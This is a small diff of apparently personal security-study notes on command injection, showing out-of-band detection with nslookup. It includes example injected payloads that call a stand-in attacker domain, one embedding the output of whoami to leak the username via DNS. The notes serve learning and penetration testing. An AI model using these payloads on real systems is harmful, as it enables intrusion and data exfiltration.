@@ -50,4 +50,3 @@
 - *`nslookup`* + inline execution+ a *domain* which the attacker controls: [[WEB/vulnerabilities/Command Injection/payload#by using out-of-band (OAST)|payload]]
 	- ex: `& nslookup kgji2ohoyw.web-attacker.com &`
 	- ex: ``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`` => `wwwuser.kgji2ohoyw.web-attacker.com`
-/gitcomm
